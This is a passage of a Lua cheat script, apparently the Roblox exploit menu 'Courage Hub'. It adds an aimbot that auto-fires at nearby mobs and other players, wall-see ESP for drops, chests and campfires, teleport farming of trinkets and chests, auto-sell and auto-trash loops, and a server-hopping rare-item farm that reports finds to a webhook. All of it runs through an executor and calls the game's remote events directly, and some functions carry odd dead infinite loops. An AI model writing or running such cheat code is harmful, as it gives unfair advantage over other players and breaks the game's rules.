		local partySystemGui = localPlayer.PlayerGui:FindFirstChild("PartySystemGui")
		if not partySystemGui then
			return {}
		end
		local tbl10 = {}

		for _, descendant in ipairs(partySystemGui:GetDescendants()) do
			if descendant.Name == "NameLabel" and descendant:IsA("TextLabel") and descendant.Text ~= "" then
				local str2 = descendant.Text:gsub("%s*%(.*%)%s*$", "")

				if str2 ~= "" and str2 ~= "Invite Friends" then
					tbl10[str2] = true
				end
			end
		end

		return tbl10
	end

	local function getHumanoidRootPart2()
		local child = getChild()
		if not child then
			return nil
		end
		local magnitude2 = math.huge
		local v27 = fn26()
		local monsters3 = workspace:FindFirstChild("Monsters")
		local humanoidRootPart2 = nil

		if monsters3 then
			humanoidRootPart2 = nil

			for _, child2 in ipairs(monsters3:GetChildren()) do
				if not child2:IsA("Model") then
					continue
				end
				local humanoid = child2:FindFirstChildOfClass("Humanoid")
				if not (humanoid and not (humanoid.Health <= 0)) then
					continue
				end

				if child2:GetAttribute("MobDead") then
					continue
				end
				local humanoidRootPart = child2:FindFirstChild("HumanoidRootPart") or child2:FindFirstChildWhichIsA("BasePart")

				if humanoidRootPart then
					local magnitude = (humanoidRootPart.Position - child.Position).Magnitude

					if magnitude < magnitude2 then
						magnitude2 = magnitude
						humanoidRootPart2 = humanoidRootPart
					end
				end
			end
		end

		for _, player in ipairs(Players:GetPlayers()) do
			if player == localPlayer then
				continue
			end

			if v27[player.DisplayName] or v27[player.Name] then
				continue
			end
			local character = player.Character
			if not character then
				continue
			end
			local child2 = character:FindFirstChildOfClass("Humanoid")
			if not (child2 and not (child2.Health <= 0)) then
				continue
			end
			local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

			if humanoidRootPart then
				local magnitude = (humanoidRootPart.Position - child.Position).Magnitude

				if magnitude < magnitude2 then
					magnitude2 = magnitude
					humanoidRootPart2 = humanoidRootPart
				end
			end
		end

		return humanoidRootPart2
	end

	tbl6.ShadowAim = Shadowbeam:AddToggle("ShadowAim", {
		Text = "Shadowbeam Aimbot",
		Description = "Manual shots auto-aim at nearest mob",
		Default = false,
		Callback = function(shadowbeamAimbot)
			shadowbeamAimbot2 = shadowbeamAimbot
			if not AimCFrame or not get then
				return
			end

			if shadowbeamAimbot then
				AimCFrame.Get = function()
					local humanoidRootPart = getHumanoidRootPart2()

					if humanoidRootPart then
						local child = getChild()
						if child then
							return CFrame.lookAt(child.Position, humanoidRootPart.Position)
						end
					end

					return get()
				end
			else
				AimCFrame.Get = get
			end
		end,
	})

	tbl6.AutoBeam = Shadowbeam:AddToggle("AutoBeam", {
		Text = "Auto ShadowBeam Aimbot",
		Description = "Auto fires at nearest mob/player",
		Default = false,
		Callback = function(autoShadowBeamAimbot)
			autoShadowBeamAimbot2 = autoShadowBeamAimbot

			if connection13 then
				connection13:Disconnect()
				connection13 = nil
			end

			if not autoShadowBeamAimbot or not consumableEvent then
				return
			end

			connection13 = service.Heartbeat:Connect(function()
				if not autoShadowBeamAimbot2 then
					return
				end
				local character = getCharacter()
				if not character then
					return
				end
				local tool = character:FindFirstChildOfClass("Tool")
				if not tool then
					return
				end

				if not tool:GetAttribute("ConsumableRemote") then
					return
				end
				local humanoidRootPart = getHumanoidRootPart2()
				if not humanoidRootPart then
					return
				end
				local child = getChild()
				if not child then
					return
				end

				pcall(function()
					consumableEvent:FireServer(tool.Name, CFrame.lookAt(child.Position, humanoidRootPart.Position))
				end)
			end)
		end,
	})

	fn15(function()
		autoM12 = false
		autoM22 = false
		autoShadowBeamAimbot2 = false

		if AimCFrame and get then
			AimCFrame.Get = get
		end

		if connection13 then
			connection13:Disconnect()
			connection13 = nil
		end

		if connection11 then
			connection11:Disconnect()
			connection11 = nil
		end

		if connection12 then
			connection12:Disconnect()
			connection12 = nil
		end
	end)
end

local v25, Chests, v26, systems, npCs, interactPromptEvent, sellItemsEvent, trashItemsEvent, dialogEvent, registerNPCInteraction
local requestShopCatalog, trinketFarm2, connection11, fn25, tbl10, tbl11, tbl12, tbl13, children, children2
local connection12, connection13, connection14, fn26
local v27, drops

do
	local v28 = tbl8.TrinketFarm:AddGroupbox("Trinket Farm")
	local v29 = tbl8.TrinketFarm:AddGroupbox("Pickup Aura")
	v25 = tbl8.TrinketFarm:AddGroupbox("Sell / Trash")
	Chests = tbl8.TrinketFarm:AddGroupbox("Chests")
	v26 = tbl8.TrinketFarm:AddGroupbox("NPC Remotes")
	v27 = tbl8.ESP:AddGroupbox("Trinket ESP")
	drops = workspace:FindFirstChild("Drops")
	systems = workspace:FindFirstChild("Systems")
	local trinketSpawns = workspace:FindFirstChild("TrinketSpawns")
	npCs = workspace:FindFirstChild("NPCs")
	local remotes = game:GetService("ReplicatedStorage").Remotes
	interactPromptEvent = remotes:WaitForChild("InteractPromptEvent")
	sellItemsEvent = remotes:WaitForChild("SellItemsEvent")
	trashItemsEvent = remotes:WaitForChild("TrashItemsEvent")
	dialogEvent = remotes:WaitForChild("DialogEvent")
	registerNPCInteraction = remotes:FindFirstChild("RegisterNPCInteraction")
	requestShopCatalog = remotes:FindFirstChild("RequestShopCatalog")
	trinketFarm2 = false
	connection11 = nil
	local now2 = nil
	local tbl14 = {}

	local function fn27(arg)
		local tbl15 = {}

		for k, v30 in pairs(arg) do
			if type(k) == "string" and v30 == true then
				tbl15[k] = true
			elseif type(v30) == "string" then
				tbl15[v30] = true
			end
		end

		return tbl15
	end

	local function getNames()
		local names = {}
		local tbl15 = {}
		local v30 = ipairs
		local children3 = drops and drops:GetChildren() or {}

		for _, child in v30(children3) do
			if child:IsA("Model") and not tbl15[child.Name] then
				table.insert(names, child.Name)
				tbl15[child.Name] = true
			end
		end

		table.sort(names)
		table.insert(names, 1, "All")
		return names
	end

	tbl7.TrinketFilter = v28:AddDropdown("TrinketFilter", {
		Text = "Farm These",
		Description = "Pick which items to pick up",
		Values = getNames(),
		Default = { "All" },
		Multi = true,
		Callback = function(farmThese)
			tbl14 = fn27(farmThese)
		end,
	})

	v28:AddButton({
		Text = "Refresh List",
		Func = function()
			pcall(function()
				lib.Options.TrinketFilter:SetValues(getNames())
			end)
		end,
	})

	local function fn28(child)
		if not next(tbl14) or tbl14.All then
			return true
		end
		return tbl14[child.Name] == true
	end

	fn25 = function()
		local v30 = ipairs
		local children3 = drops and drops:GetChildren() or {}

		for _, child in v30(children3) do
			if not trinketFarm2 then
				break
			end

			if not child:IsA("Model") then
				continue
			end

			if not fn28(child) then
				continue
			end
			local argument = child:FindFirstChild("Argument")
			if not argument or not argument:IsA("StringValue") then
				continue
			end
			local handle = child:FindFirstChild("Handle") or child:FindFirstChildWhichIsA("BasePart")
			if not handle then
				continue
			end

			if not getChild() then
				return
			end
			fn18(CFrame.new(handle.Position + Vector3.new(0, -1, 0)))

			pcall(function()
				interactPromptEvent:FireServer(argument.Value, child)
			end)
		end
	end

	tbl6.TrinketFarm = v28:AddToggle("TrinketFarm", {
		Text = "Trinket Farm",
		Description = "Farm all trinket spawns",
		Default = false,
		Callback = function(trinketFarm)
			trinketFarm2 = trinketFarm
			if not trinketFarm then
				return
			end

			task.spawn(function()
				local child = trinketSpawns and trinketSpawns:GetChildren()[1]

				if child and child:IsA("BasePart") then
					fn18(CFrame.new(child.Position + Vector3.new(0, -3, 0)))
				end

				while trinketFarm2 and fn17("TrinketFarm") do
					fn25()
					local v30 = ipairs
					local children3 = trinketSpawns and trinketSpawns:GetChildren() or {}

					for _, child2 in v30(children3) do
						if not (trinketFarm2 and fn17("TrinketFarm")) then
							break
						end

						if not child2:IsA("BasePart") then
							continue
						end
						local child3 = getChild()

						if not child3 then
							task.wait(0.5)
							break
						else
							fn18(CFrame.new(child2.Position + Vector3.new(0, -3, 0)))
							child3.AssemblyLinearVelocity = Vector3.zero
							task.wait(0.3)
							fn25()
						end
					end

					task.wait(0.5)
				end
			end)
		end,
	})

	v28:AddLabel(tostring(trinketSpawns and #trinketSpawns:GetChildren() or 0) .. " spawn points")

	tbl6.AutoPickup = v29:AddToggle("AutoPickup", {
		Text = "Pickup Aura",
		Description = "Auto grab all drops near you",
		Default = false,
		Callback = function(pickupAura)
			if connection11 then
				connection11:Disconnect()
				connection11 = nil
			end

			if not pickupAura then
				return
			end

			connection11 = service.Heartbeat:Connect(function()
				if not fn17("AutoPickup") then
					return
				end

				if not now2 or tick() - now2 < 0.5 then
					if not now2 then
						now2 = tick()
					end

					return
				end

				now2 = tick()
				local child = getChild()
				if not child then
					return
				end
				local v30 = ipairs
				local children3 = drops and drops:GetChildren() or {}

				for _, child2 in v30(children3) do
					if not child2:IsA("Model") then
						continue
					end
					local argument = child2:FindFirstChild("Argument")
					if not (argument and argument:IsA("StringValue")) then
						continue
					end
					local handle = child2:FindFirstChild("Handle") or child2:FindFirstChildWhichIsA("BasePart")

					if handle then
						if (handle.Position - child.Position).Magnitude <= 20 then
							pcall(function()
								interactPromptEvent:FireServer(argument.Value, child2)
							end)
						end
					end
				end

				if not systems then
					return
				end

				for _, descendant in ipairs(systems:GetDescendants()) do
					if not descendant:FindFirstChild("IsInteractable") then
						continue
					end
					local argument = descendant:FindFirstChild("Argument")
					if not (argument and argument:IsA("StringValue")) then
						continue
					end
					local handle = descendant:FindFirstChild("Handle") or descendant:FindFirstChildWhichIsA("BasePart")

					if handle then
						if (handle.Position - child.Position).Magnitude <= 20 then
							pcall(function()
								interactPromptEvent:FireServer(argument.Value, descendant)
							end)
						end
					end
				end
			end)

		end,
	})

	tbl10 = {}
	tbl11 = {}
	tbl12 = {}
	tbl13 = {}
	children = {}
	children2 = {}
	connection12 = nil
	connection13 = nil
	connection14 = nil

	local function createHighlight(arg, fillColor, fillTransparency)
		local highlight = Instance.new("Highlight", arg)
		highlight.FillColor = fillColor
		highlight.OutlineColor = fillColor
		highlight.FillTransparency = fillTransparency or 0.5
		return highlight
	end

	local function createBillboardGui(parent, text, textColor3)
		local parent2 = parent:IsA("BasePart") and parent or parent:FindFirstChild("Handle") or parent:FindFirstChildWhichIsA("BasePart")
		if not parent2 then
			return nil
		end
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = "_CH_ESP"
		billboardGui.Size = UDim2.new(0, 200, 0, 30)
		billboardGui.StudsOffset = Vector3.new(0, -3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Adornee = parent2
		billboardGui.Parent = parent

		local textLabel = Instance.new("TextLabel", billboardGui)
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text
		textLabel.TextColor3 = textColor3
		textLabel.TextStrokeTransparency = 0
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextScaled = true
		return billboardGui
	end

	fn26 = function(arg, arg2)
		for k, v30 in pairs(arg) do
			pcall(function()
				v30:Destroy()
			end)

			arg[k] = nil
		end

		for k, v30 in pairs(arg2) do
			pcall(function()
				v30:Destroy()
			end)

			arg2[k] = nil
		end
	end

	local attributes = {
		Common = Color3.fromRGB(255, 255, 255),
		Uncommon = Color3.fromRGB(30, 255, 0),
		Rare = Color3.fromRGB(0, 112, 255),
		Elite = Color3.fromRGB(163, 53, 238),
		Legendary = Color3.fromRGB(255, 128, 0),
		Mythic = Color3.fromRGB(255, 0, 0),
		Godly = Color3.fromRGB(255, 0, 0),
		Unobtainable = Color3.fromRGB(255, 0, 255),
		Christmas = Color3.fromRGB(255, 80, 80),
	}

	local attributes2 = {}

	v27:AddDropdown("ESPRarityFilter", {
		Text = "Show Rarities",
		Values = {
			"All",
			"Common",
			"Uncommon",
			"Rare",
			"Elite",
			"Legendary",
			"Mythic",
			"Godly",
			"Unobtainable",
		},
		Default = { "All" },
		Multi = true,
		Callback = function(showRarities)
			attributes2 = fn27(showRarities)
		end,
	})

	tbl6.DropESP = v27:AddToggle("DropESP", {
		Text = "Drop ESP",
		Description = "See dropped items with names and rarity colors",
		Default = false,
		Callback = function(dropEsp)
			if connection12 then
				connection12:Disconnect()
				connection12 = nil
			end

			fn26(tbl10, tbl11)
			if not dropEsp then
				return
			end

			connection12 = service.Heartbeat:Connect(function()
				if not fn17("DropESP") then
					return
				end
				local all = not next(attributes2) or attributes2.All
				local v30 = ipairs
				local children3 = drops and drops:GetChildren() or {}

				for _, child in v30(children3) do
					if not child:IsA("Model") then
						continue
					end
					local attribute = child:GetAttribute("Rarity") or "Common"

					if not all and not attributes2[attribute] then
						if tbl10[child] then
							pcall(function()
								tbl10[child]:Destroy()
							end)

							tbl10[child] = nil

							pcall(function()
								tbl11[child]:Destroy()
							end)

							tbl11[child] = nil
						end
					elseif not tbl10[child] then
						local attribute2 = attributes[attribute] or attributes.Common
						tbl10[child] = createHighlight(child, attribute2, 0.6)
						tbl11[child] = createBillboardGui(child, child.Name .. " [" .. attribute .. "]", attribute2)
					end
				end

				for k in pairs(tbl10) do
					if not k.Parent then
						pcall(function()
							tbl10[k]:Destroy()
						end)

						tbl10[k] = nil

						pcall(function()
							tbl11[k]:Destroy()
						end)

						tbl11[k] = nil
					end
				end
			end)
		end,
	})

	tbl6.ChestESP = v27:AddToggle("ChestESP", {
		Text = "Chest ESP",
		Description = "See chests through walls",
		Default = false,
		Callback = function(chestEsp)
			if connection13 then
				connection13:Disconnect()
				connection13 = nil
			end

			fn26(tbl12, tbl13)
			if not chestEsp then
				return
			end

			connection13 = service.Heartbeat:Connect(function()
				if not fn17("ChestESP") then
					return
				end

				if not systems then
					return
				end

				for _, descendant in ipairs(systems:GetDescendants()) do
					local argument = descendant:FindFirstChild("Argument")

					if argument and argument.Value == "OpenChest" and descendant:FindFirstChild("IsInteractable") and not tbl12[descendant] then
						tbl12[descendant] = createHighlight(descendant, Color3.fromRGB(0, 255, 255), 0.5)
						tbl13[descendant] = createBillboardGui(descendant, "Chest", Color3.fromRGB(0, 255, 255))
					end
				end

				for k in pairs(tbl12) do
					if not k.Parent then
						pcall(function()
							tbl12[k]:Destroy()
						end)

						tbl12[k] = nil

						pcall(function()
							tbl13[k]:Destroy()
						end)

						tbl13[k] = nil
					end
				end
			end)
		end,
	})

	local campfires = workspace.Map:FindFirstChild("Campfires")

	tbl6.CampfireESP = v27:AddToggle("CampfireESP", {
		Text = "Campfire ESP",
		Description = "See campfires through walls",
		Default = false,
		Callback = function(campfireEsp)
			if connection14 then
				connection14:Disconnect()
				connection14 = nil
			end

			fn26(children, children2)
			if not campfireEsp then
				return
			end

			if campfires then
				for _, child in ipairs(campfires:GetChildren()) do
					if child.Name == "Campfire" then
						children[child] = createHighlight(child, Color3.fromRGB(255, 140, 0), 0.5)
						children2[child] = createBillboardGui(child, "Campfire", Color3.fromRGB(255, 140, 0))
					end
				end

				return
			end

			do
				return
			end

			while true do
			end
		end,
	})
end

local tbl14 = { "Clement, Merchant", "David, Merchant" }

local function fn27()
	local child = getChild()
	if not child then
		return nil, nil
	end
	local magnitude2 = math.huge
	local dialogPart2 = nil
	local name2 = nil

	for _, name in ipairs(tbl14) do
		local child2 = npCs:FindFirstChild(name)
		if not child2 then
			continue
		end
		local dialogPart = child2:FindFirstChild("DialogPart") or child2:FindFirstChild("HumanoidRootPart") or child2:FindFirstChild("Torso")

		if dialogPart then
			local magnitude = (dialogPart.Position - child.Position).Magnitude

			if magnitude < magnitude2 then
				magnitude2 = magnitude
				dialogPart2 = dialogPart
				name2 = name
			end
		end
	end

	return dialogPart2, name2
end

local function fn28(name)
	local child = npCs:FindFirstChild(name)
	if not child then
		return false
	end

	if registerNPCInteraction then
		pcall(function()
			registerNPCInteraction:FireServer(name)
		end)
	end

	task.wait(0.1)

	pcall(function()
		dialogEvent:FireServer("start", child, 1)
	end)

	task.wait(0.4)

	pcall(function()
		dialogEvent:FireServer("option", child, 2)
	end)

	task.wait(0.4)
	return true
end

local function fn29()
	pcall(function()
		dialogEvent:FireServer("close")
	end)
end

local tbl15 = {}
local tbl16 = {}

local function fn30(instance)
	local rarity = instance:FindFirstChild("Rarity")
	return rarity and rarity:IsA("StringValue") and rarity.Value or "Common"
end

local function getChildren()
	local children3 = {}
	local backpack = localPlayer:FindFirstChild("Backpack")
	if not backpack then
		return children3
	end

	if not next(tbl15) then
		return children3
	end
	local all = tbl15.All

	for _, child in ipairs(backpack:GetChildren()) do
		if not child:IsA("Tool") then
			continue
		end

		if not child:GetAttribute("Favorited") then
			if not child:FindFirstChild("CannotBeDropped") then
				if all or tbl15[fn30(child)] then
					table.insert(children3, child)
				end
			end
		end
	end

	return children3
end

local function getChildren2()
	local children3 = {}
	local backpack = localPlayer:FindFirstChild("Backpack")
	if not backpack then
		return children3
	end

	if not next(tbl16) then
		do
			return children3
		end

		while true do
		end
	end

	local all = tbl16.All

	for _, child in ipairs(backpack:GetChildren()) do
		if not child:IsA("Tool") then
			continue
		end

		if not child:GetAttribute("Favorited") then
			if not child:FindFirstChild("CannotBeDropped") then
				if all or tbl16[fn30(child)] then
					table.insert(children3, child)
				end
			end
		end
	end

	return children3
end

v25:AddDropdown("SellRarities", {
	Text = "Sell Rarities",
	Values = {
		"All",
		"Common",
		"Uncommon",
		"Rare",
		"Elite",
		"Legendary",
		"Mythic",
		"Godly",
		"Unobtainable",
	},
	Default = { "Common", "Uncommon" },
	Multi = true,
	Callback = function(sellRarities)
		local tbl17 = {}

		for k, sellRarity in pairs(sellRarities) do
			if type(k) == "string" and sellRarity == true then
				tbl17[k] = true
			elseif type(sellRarity) == "string" then
				tbl17[sellRarity] = true
			end
		end

		tbl15 = tbl17
	end,
})

v25:AddDropdown("TrashRarities", {
	Text = "Trash Rarities",
	Values = {
		"All",
		"Common",
		"Uncommon",
		"Rare",
		"Elite",
		"Legendary",
		"Mythic",
		"Godly",
		"Unobtainable",
	},
	Default = { "Common" },
	Multi = true,
	Callback = function(trashRarities)
		local tbl17 = {}

		for k, trashRarity in pairs(trashRarities) do
			if type(k) == "string" and trashRarity == true then
				tbl17[k] = true
			elseif type(trashRarity) == "string" then
				tbl17[trashRarity] = true
			end
		end

		tbl16 = tbl17
	end,
})

local function fn31()
	local sellRarities = lib.Options.SellRarities
	if not sellRarities or not sellRarities.Value then
		return
	end
	local tbl17 = {}

	for k, v28 in pairs(sellRarities.Value) do
		if type(k) == "string" and v28 == true then
			tbl17[k] = true
		elseif type(v28) == "string" then
			tbl17[v28] = true
		end
	end

	tbl15 = tbl17
end

local function fn32()
	do
		local trashRarities = lib.Options.TrashRarities
		if not trashRarities or not trashRarities.Value then
			return
		end
		local tbl17 = {}

		for k, v28 in pairs(trashRarities.Value) do
			if type(k) == "string" and v28 == true then
				tbl17[k] = true
			elseif type(v28) == "string" then
				tbl17[v28] = true
			end
		end

		tbl16 = tbl17
		return
	end

	while true do
	end
end

fn31()
fn32()

task.defer(function()
	task.wait(2)
	fn31()
	fn32()
end)

v25:AddButton({
	Text = "Sell",
	Description = "Sell selected rarities at merchant",
	Func = function()
		fn31()
		local v28, v29 = fn27()
		if not v28 then
			fn16("No merchant found", 3)
			return
		end
		fn18(CFrame.new(v28.Position + Vector3.new(2, 0, 0)))
		task.wait(0.3)
		if not fn28(v29) then
			fn16("Failed to open sell", 3)
			return
		end
		local children3 = getChildren()

		if #children3 == 0 then
			fn29()
			fn16("Nothing to sell", 2)
			return
		end

		pcall(function()
			sellItemsEvent:FireServer(children3)
		end)

		task.wait(0.5)
		fn29()
		fn16("Sold " .. #children3 .. " items", 3)
	end,
})

do
	v25:AddButton({
		Text = "Trash",
		Description = "Trash selected rarities from inventory",
		Func = function()
			fn32()
			local children3 = getChildren2()
			if #children3 == 0 then
				fn16("Nothing to trash", 2)
				return
			end

			pcall(function()
				trashItemsEvent:FireServer(children3)
			end)

			fn16("Trashed " .. #children3 .. " items", 3)
		end,
	})

	local autoSellLoop2 = false

	tbl6.AutoSell = v25:AddToggle("AutoSell", {
		Text = "Auto Sell Loop",
		Description = "Keep selling on repeat",
		Default = false,
		Callback = function(autoSellLoop)
			autoSellLoop2 = autoSellLoop
			if not autoSellLoop then
				return
			end
			fn31()

			task.spawn(function()
				while autoSellLoop2 and fn17("AutoSell") do
					fn31()

					if #getChildren() > 0 then
						local v28, v29 = fn27()

						if v28 then
							fn18(CFrame.new(v28.Position + Vector3.new(2, 0, 0)))
							task.wait(0.3)

							if fn28(v29) then
								local children3 = getChildren()

								if #children3 > 0 then
									pcall(function()
										sellItemsEvent:FireServer(children3)
									end)
								end

								task.wait(0.5)
								fn29()
							end
						end
					end

					task.wait(3)
				end
			end)
		end,
	})

	local autoTrashLoop2 = false

	tbl6.AutoTrash = v25:AddToggle("AutoTrash", {
		Text = "Auto Trash Loop",
		Description = "Keep trashing on repeat",
		Default = false,
		Callback = function(autoTrashLoop)
			autoTrashLoop2 = autoTrashLoop
			if not autoTrashLoop then
				return
			end
			fn32()

			task.spawn(function()
				while autoTrashLoop2 and fn17("AutoTrash") do
					fn32()
					local children3 = getChildren2()

					if #children3 > 0 then
						pcall(function()
							trashItemsEvent:FireServer(children3)
						end)
					end

					task.wait(3)
				end
			end)
		end,
	})

	local autoOpenChests2 = false

	tbl6.ChestFarm = Chests:AddToggle("ChestFarm", {
		Text = "Auto Open Chests",
		Description = "Open all chests",
		Default = false,
		Callback = function(autoOpenChests)
			autoOpenChests2 = autoOpenChests
			if not autoOpenChests then
				return
			end

			task.spawn(function()
				while autoOpenChests2 and fn17("ChestFarm") do
					if not systems then
						task.wait(1)
						continue
					end

					for _, descendant in ipairs(systems:GetDescendants()) do
						if not (autoOpenChests2 and fn17("ChestFarm")) then
							break
						end
						local argument = descendant:FindFirstChild("Argument")
						if not argument or argument.Value ~= "OpenChest" then
							continue
						end

						if not descendant:FindFirstChild("IsInteractable") then
							continue
						end
						local handle = descendant:FindFirstChild("Handle") or descendant.PrimaryPart or descendant:FindFirstChildWhichIsA("BasePart")
						if not handle then
							continue
						end

						if not getChild() then
							task.wait(1)
							break
						end

						fn19(CFrame.new(handle.Position + Vector3.new(0, -1, 0)), function()
							return not autoOpenChests2
						end)

						task.wait(0.5)

						pcall(function()
							interactPromptEvent:FireServer("OpenChest", descendant)
						end)

						task.wait(2)
						fn25()
						task.wait(1)
					end

					task.wait(3)
				end
			end)
		end,
	})

	v26:AddButton({
		Text = "Close Dialogue",
		Func = function()
			fn29()
		end,
	})

	local function getNames()
		local names = {}
		local v28 = ipairs
		local children3 = npCs and npCs:GetChildren() or {}

		for _, child in v28(children3) do
			if child:IsA("Model") then
				table.insert(names, child.Name)
			end
		end

		table.sort(names)
		return names
	end

	tbl7.NPCShopTarget = v26:AddDropdown("NPCShopTarget", {
		Text = "NPC",
		Values = getNames(),
		Default = nil,
		Multi = false,
		Callback = function()
		end,
	})

	local function fn33(name)
		local child = npCs:FindFirstChild(name)
		if not child then
			return
		end
		local dialogPart = child:FindFirstChild("DialogPart") or child:FindFirstChild("HumanoidRootPart") or child:FindFirstChild("Torso")

		if dialogPart then
			fn18(CFrame.new(dialogPart.Position + Vector3.new(2, 0, 0)))
		end
	end

	v26:AddButton({
		Text = "Open Shop",
		Func = function()
			local value = lib.Options.NPCShopTarget and lib.Options.NPCShopTarget.Value
			if not value or value == "" then
				fn16("Pick an NPC", 2)
				return
			end
			fn33(value)

			if requestShopCatalog then
				pcall(function()
					requestShopCatalog:FireServer(value)
				end)
			end
		end,
	})

	v26:AddButton({
		Text = "Register Interaction",
		Func = function()
			local value = lib.Options.NPCShopTarget and lib.Options.NPCShopTarget.Value
			if not value or value == "" then
				fn16("Pick an NPC", 2)
				return
			end
			fn33(value)

			if registerNPCInteraction then
				pcall(function()
					registerNPCInteraction:FireServer(value)
				end)
			end
		end,
	})

	fn15(function()
		trinketFarm2 = false
		autoSellLoop2 = false
		autoTrashLoop2 = false
		autoOpenChests2 = false

		if connection11 then
			connection11:Disconnect()
			connection11 = nil
		end

		if connection12 then
			connection12:Disconnect()
			connection12 = nil
		end

		if connection13 then
			connection13:Disconnect()
			connection13 = nil
		end

		if connection14 then
			connection14:Disconnect()
			connection14 = nil
		end

		fn26(tbl10, tbl11)
		fn26(tbl12, tbl13)
		fn26(children, children2)
		fn29()
	end)

	local Config, rarityFarm2, n10

	do
		local v28 = tbl8.RarityFarm:AddGroupbox("Rarity Farm")
		Config = tbl8.RarityFarm:AddGroupbox("Config")
		local drops2 = workspace:FindFirstChild("Drops")
		local trinketSpawns = workspace:FindFirstChild("TrinketSpawns")
		workspace:FindFirstChild("Systems")
		local remotes = game:GetService("ReplicatedStorage"):FindFirstChild("Remotes")
		local interactPromptEvent2 = remotes and remotes:FindFirstChild("InteractPromptEvent")
		rarityFarm2 = false
		local attributes = {}
		n10 = num or 1
		getgenv()._rfWebhookUrl = getgenv()._rfWebhookUrl or ""

		local function fn34()
			local rfRarities = lib.Options.RFRarities
			if not rfRarities or not rfRarities.Value then
				return
			end
			local tbl17 = {}

			for k, v29 in pairs(rfRarities.Value) do
				if type(k) == "string" and v29 == true then
					tbl17[k] = true
				elseif type(v29) == "string" then
					tbl17[v29] = true
				end
			end

			attributes = tbl17
		end

		local tbl17 = {
			Common = 11184810,
			Uncommon = 2031360,
			Rare = 28927,
			Elite = 10696174,
			Legendary = 16744448,
			Mythic = 16711680,
			Godly = 16711680,
			Unobtainable = 16711935,
			Christmas = 16732240,
		}

		local function fn35(arg)
			if getgenv()._rfWebhookUrl == "" or #arg == 0 then
				return
			end

			task.spawn(function()
				local request_ = request or syn and syn.request or http_request
				if not request_ then
					return
				end
				local HttpService = game:GetService("HttpService")
				local str2 = ""

				for _, v29 in ipairs(arg) do
					str2 ..= "**" .. v29.name .. "** (" .. v29.rarity:lower() .. ")\n"
				end

				local json = HttpService:JSONEncode({
					embeds = {
						{
							title = "Rarity Farm — " .. #arg .. " Item" .. (#arg > 1 and "s" or "") .. " Found",
							description = str2,
							color = tbl17[arg[1].rarity] or 16777215,
							footer = { text = "Courage Hub | " .. localPlayer.Name },
							timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
						},
					},
				})

				pcall(function()
					request_({
						Url = getgenv()._rfWebhookUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = json,
					})
				end)
			end)
		end

		local function fn36()
			local mainGui = localPlayer.PlayerGui:FindFirstChild("MainGui")
			if not mainGui or not mainGui.Enabled then
				return true
			end
			local currentCamera2 = workspace.CurrentCamera
			if currentCamera2 and currentCamera2.CameraType == Enum.CameraType.Scriptable then
				return true
			end
			return false
		end

		v28:AddDropdown("RFRarities", {
			Text = "Target Rarities",
			Values = { "Uncommon", "Rare", "Elite", "Legendary", "Mythic", "Godly", "Unobtainable" },
			Default = { "Elite", "Legendary", "Mythic", "Godly", "Unobtainable" },
			Multi = true,
			Callback = function(targetRarities)
				local tbl18 = {}

				for k, targetRarity in pairs(targetRarities) do
					if type(k) == "string" and targetRarity == true then
						tbl18[k] = true
					elseif type(targetRarity) == "string" then
						tbl18[targetRarity] = true
					end
				end

				attributes = tbl18
			end,
		})

		fn34()

		local function fn37()
			local v29 = ipairs
			local children3 = drops2 and drops2:GetChildren() or {}

			for _, child in v29(children3) do
				if child:IsA("Model") then
					if attributes[child:GetAttribute("Rarity") or "Common"] then
						return true
					end
				end
			end

			return false
		end

		local function fn38()
			local tbl18 = {}
			local v29 = ipairs
			local children3 = drops2 and drops2:GetChildren() or {}

			for _, child in v29(children3) do
				if not rarityFarm2 then
					break
				end

				if not child:IsA("Model") then
					continue
				end
				local attribute = child:GetAttribute("Rarity") or "Common"
				if not attributes[attribute] then
					continue
				end
				local argument = child:FindFirstChild("Argument")
				if not argument or not argument:IsA("StringValue") then
					continue
				end
				local handle = child:FindFirstChild("Handle") or child:FindFirstChildWhichIsA("BasePart")
				if not handle then
					continue
				end

				if not getChild() then
					return tbl18
				end
				local name = child.Name
				local position = handle.Position
				fn18(CFrame.new(handle.Position + Vector3.new(0, -1, 0)))

				pcall(function()
					interactPromptEvent2:FireServer(argument.Value, child)
				end)

				task.wait(0.5)
				table.insert(tbl18, { name = name, rarity = attribute, pos = position })
			end

			return tbl18
		end

		local function fn39()
			local service2 = game:GetService("TeleportService")
			local placeId = game.PlaceId
			local tbl18 = { _chAutoSlot = n10, _chAutoFarm = true }
			local ids = {}

			pcall(function()
				local data = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"))

				if data and data.data then
					for _, v29 in ipairs(data.data) do
						if v29.id ~= game.JobId and v29.playing and v29.maxPlayers and v29.playing < v29.maxPlayers then
							table.insert(ids, v29.id)
						end
					end
				end
			end)

			if #ids > 0 then
				pcall(function()
					service2:TeleportToPlaceInstance(placeId, ids[math.random(#ids)], localPlayer, tbl18)
				end)
			else
				pcall(function()
					service2:Teleport(placeId, localPlayer, tbl18)
				end)
			end
		end

		local now2 = 0
		local tbl18 = {}

		game:GetService("TeleportService").TeleportInitFailed:Connect(function(arg, arg2)
			if arg2 == Enum.TeleportResult.GameFull or arg2 == Enum.TeleportResult.Failure then
				tbl18[game.JobId] = true
			end

			fn16("Teleport failed, retrying...", 2)
			task.wait(2)
			fn39()
		end)

		task.spawn(function()
			while true do
				task.wait(10)

				if now2 > 0 and tick() - now2 > 8 then
					now2 = 0
					fn16("Hop stalled, forcing retry...", 2)
					fn39()
				end
			end
		end)

		local v29 = fn39

		fn39 = function()
			now2 = tick()
			v29()
		end

		tbl6.RarityFarm = v28:AddToggle("RarityFarm", {
			Text = "Rarity Farm",
			Description = "AFK farm rare drops, auto hops servers",
			Default = false,
			Callback = function(rarityFarm)
				rarityFarm2 = rarityFarm
				if not rarityFarm then
					return
				end
				fn34()

				task.spawn(function()
					do
						fn16("Rarity Farm started", 3)

						while fn36() do
							task.wait(1)
						end

						fn18(CFrame.new(1017.3, 577.75, 3078.35))

						while rarityFarm2 and fn17("RarityFarm") do
							if fn36() then
								task.wait(1)
								continue
							end
